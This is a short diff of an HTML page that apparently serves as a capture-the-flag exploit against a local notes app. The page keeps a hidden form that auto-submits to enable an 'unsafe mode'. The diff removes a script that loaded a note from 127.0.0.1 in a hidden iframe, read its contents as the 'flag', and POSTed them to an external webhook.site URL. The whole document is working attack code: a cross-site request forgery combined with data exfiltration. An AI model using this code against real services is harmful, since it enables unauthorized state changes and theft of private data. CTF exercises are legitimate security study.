@@ -8,30 +8,8 @@
         <input type="hidden" name="id" value="1">
         <input type="hidden" name="enable" value="1">
     </form>
-    <iframe id="noteFrame" style="display:none;"></iframe>
     <script>
-        // Submit the form to enable unsafe mode
         document.getElementById('unsafeForm').submit();
-
-        // After a delay, load the note page in the iframe
-        setTimeout(() => {
-            const iframe = document.getElementById('noteFrame');
-            iframe.src = 'http://127.0.0.1:7189/notes/1';
-
-            // Wait for the iframe to load, then extract the flag
-            iframe.onload = () => {
-                try {
-                    const noteContent = iframe.contentDocument.querySelector('.note-content').innerText;
-                    fetch('https://webhook.site/d1b4da46-4ad8-4ec4-8241-bcdbcefd6aa0', {
-                        method: 'POST',
-                        body: JSON.stringify({ flag: noteContent }),
-                        headers: { 'Content-Type': 'application/json' }
-                    });
-                } catch (e) {
-                    console.error('Error extracting flag:', e);
-                }
-            };
-        }, 2000); // Delay to ensure form submission completes
     </script>
 </body>
 </html>
